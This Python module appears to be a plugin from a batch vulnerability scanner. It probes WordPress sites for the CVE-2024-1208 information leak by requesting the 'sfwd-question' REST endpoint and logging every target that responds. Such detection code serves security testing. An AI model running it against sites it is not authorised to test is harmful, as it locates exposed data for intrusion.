#! /usr/bin/python3
# -*- encoding: utf-8 -*-
import requests,urllib3
from pub.com.outprint import OutPrintInfo,OutPrintInfoSuc,OutPrintInfoErr
from pub.com.reqset import ReqSet
from pub.com.output import OutPutFile
urllib3.disable_warnings()
class Cve_2024_1208:
    def get_url(self,input_url):
        try:
            url = input_url + "/wp-json/wp/v2/sfwd-question/"
            req = requests.get(url,headers=self.headers,proxies=self.proxy,verify=self.ssl)
            if "date_gmt" in req.text and req.status_code == 200:
                OutPrintInfoSuc("WordPress", f'目标存在CVE-2024-1208敏感信息泄露漏洞: {url}')
                if self.batch:
                    OutPutFile("wordpress_2024_1208.txt",f'目标存在CVE-2024-1208敏感信息泄露漏洞: {url}')

                return True
            else:
                if not self.batch:
                    OutPrintInfo("WordPress", f'目标不存在CVE-2024-1208敏感信息泄露漏洞')
                return False
        except Exception as e:
            if not self.batch:
                OutPrintInfo("WordPress",'目标请求出错')
            return False


    def main(self,target):
        self.batch = target["batch_work"]
        url = target["url"].strip('/ ')
        header = target["header"]
        self.ssl = target["ssl"]
        proxy = target["proxy"]
        self.headers, self.proxy = ReqSet(header=header, proxy=proxy, bwork=self.batch)
        if not self.batch:
            OutPrintInfo("WordPress", '开始检测CVE-2024-1208敏感信息泄露漏洞...')
        self.get_url(url)
        if not self.batch:
            OutPrintInfo("WordPress", 'CVE-2024-1208敏感信息泄露漏洞检测结束')



